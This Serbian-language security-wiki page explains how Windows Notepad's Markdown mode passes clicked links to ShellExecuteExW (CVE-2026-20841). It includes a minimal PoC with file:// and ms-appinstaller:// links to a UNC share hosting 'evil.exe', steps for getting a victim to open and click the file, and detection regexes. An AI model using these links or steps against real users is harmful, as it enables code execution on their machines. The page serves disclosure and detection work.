# Zloupotreba Windows Protocol Handler-a / ShellExecute-a (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows aplikacije koje renderuju Markdown ili HTML mogu proslediti kliknute ciljeve funkciji `ShellExecuteExW`. Pošto ShellExecute prosleđuje registrovane URI schemes i asocijacije datoteka, rendereru je potrebna eksplicitna allowlist-a, umesto pretpostavke da je svaki link HTTP(S). Ponašanje Notepad-a opisano u nastavku odnosi se na CVE-2026-20841 i ne treba ga generalizovati na svaki renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW površina napada u Windows Notepad Markdown režimu
- Notepad bira Markdown režim **samo za ekstenzije `.md`** putem poređenja fiksnog stringa u `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Podržani Markdown linkovi:
- Standardni: `[text](target)`
- Autolink: `<target>` (renderuje se kao `[target](target)`), tako da su obe sintakse važne za payload-e i detections.
- Klikovi na linkove obrađuju se u `sub_140170F60()`, koji primenjuje slabo filtriranje, a zatim poziva `ShellExecuteExW`.
- `ShellExecuteExW` prosleđuje zahtev **bilo kom konfigurisanom protocol handler-u**, a ne samo HTTP(S)-u.<sup>[[1]](#references)</sup>

### Razmatranja u vezi sa payload-ima
- Sve sekvence `\\` u linku **normalizuju se u `\`** pre poziva `ShellExecuteExW`, što utiče na izradu UNC/path vrednosti i detections.
- `.md` datoteke **nisu podrazumevano povezane sa Notepad-om**; žrtva i dalje mora da otvori datoteku u Notepad-u i klikne na link, ali kada se link renderuje, on može da se klikne.
- Opasne schemes primeri:<sup>[[1]](#references)</sup>
- `file://` za pokretanje lokalnog/UNC payload-a.
- `ms-appinstaller://` za pokretanje App Installer tokova. Druge lokalno registrovane schemes takođe mogu biti zloupotrebljene.

### Minimalni PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Tok exploitation-a
1. Napravite **`.md` fajl** tako da ga Notepad prikaže kao Markdown.
2. Ugradite link koristeći opasnu URI šemu (`file:`, `ms-appinstaller:` ili bilo koji instalirani handler).
3. Isporučite fajl (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ili sličnim protokolom) i ubedite korisnika da ga otvori u Notepad-u.
4. Prilikom klika, **normalizovani link** se prosleđuje funkciji `ShellExecuteExW`, a odgovarajući protocol handler izvršava referencirani sadržaj u kontekstu korisnika.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideje za detekciju
- Nadgledajte prenose `.md` fajlova preko portova/protokola koji se obično koriste za isporuku dokumenata: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsirajte Markdown linkove (standardne i autolink) i tražite **neobazirući se na velika i mala slova** `file:` ili `ms-appinstaller:`.
- Regex izrazi zasnovani na smernicama vendora za otkrivanje pristupa udaljenim resursima:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Ispravka proizvođača koju je opisao ZDI ograničava prihvaćene ciljeve na lokalne datoteke i HTTP(S). Po potrebi proširite detekcije na druge instalirane protocol handlers, jer se registrovana attack surface razlikuje u zavisnosti od sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Izvršavanje proizvoljnog koda u Windows Notepad-u](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
